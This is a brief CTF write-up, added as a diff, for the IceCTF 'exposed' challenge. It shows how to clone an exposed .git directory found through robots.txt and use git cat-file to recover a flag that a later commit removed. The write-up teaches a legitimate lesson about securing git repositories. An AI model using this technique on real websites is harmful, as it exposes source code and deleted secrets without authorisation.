@@ -1,0 +1,67 @@
+---> robots.txt
+----> disallow .git/
+
+
+cloner le GIT et chercher le flag
+
+git clone http://exposed.vuln.icec.tf/.git/
+
+[christrc@kali ~/Dr/P/co/ch/CT/I/e/e/exposed.vuln.icec.tf]$ git cat-file blob
+flag.php       .gitignore     HEAD           index.php      master         ORIG_HEAD      origin/HEAD    origin/master  robots.txt
+4183a0c  -- [HEAD]    add robots.txt (4 days ago)
+5ea1339  -- [HEAD^]   remove flag (4 days ago)
+584ae83  -- [HEAD^^]  flag route (4 days ago)
+60756b1  -- [HEAD~3]  test flag (4 days ago)
+672c8f6  -- [HEAD~4]  added colors (4 days ago)
+f5674cb  -- [HEAD~5]  enlarged text (4 days ago)
+4de7e6f  -- [HEAD~6]  added materialize and centered page (4 days ago)
+ec95d11  -- [HEAD~7]  added initial app (4 days ago)
+90c2cd2  -- [HEAD~8]  gitignore (4 days ago)
+fd2ac4d  -- [HEAD~9]  initial commit (4 days ago)
+
+
+
+[christrc@kali ~/Dr/P/co/ch/CT/I/e/e/exposed.vuln.icec.tf]$ git cat-file -p f5674cb
+tree dfba863eac680923381110995ee9406187beed9d
+parent 4de7e6fbbba6f94bc146b33bbfe6c0155f3c2fd4
+author James Sigur▒arson <jamiees2@gmail.com> 1470864477 +0000
+committer James Sigur▒arson <jamiees2@gmail.com> 1470865026 +0000
+
+enlarged text
+[christrc@kali ~/Dr/P/co/ch/CT/I/e/e/exposed.vuln.icec.tf]$ git cat-file -p dfba
+100644 blob a4bbcd16a46d691e5053e50387258b7b8e918601    .gitignore
+100644 blob 1c059ca5afb0cd8de5182e4c86d6435113ba028c    index.php
+[christrc@kali ~/Dr/P/co/ch/CT/I/e/e/exposed.vuln.icec.tf]$ git cat-file -p 1c05
+<!doctype html>
+<html>
+    <head>
+        <title>Hello World</title>
+        <meta charset="utf-8" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css">
+        <style type="text/css">
+        html {
+            height: 100%;
+        }
+        body {
+            min-height: 100%;
+            height: 100%;
+        }
+        .hello {
+            font-size: 2em;
+            width: 100%;
+        }
+        .hello-wrapper {
+            height: 100%;
+        }
+        </style>
+    </head>
+    <body>
+        <div class="valign-wrapper hello-wrapper">
+            <div class="hello valign center-align">
+            <?php
+                echo 'Hello World! IceCTF{secure_y0ur_g1t_repos_pe0ple}';
+            ?>
+            </div>
+        </div>
+    </body>
+</html>
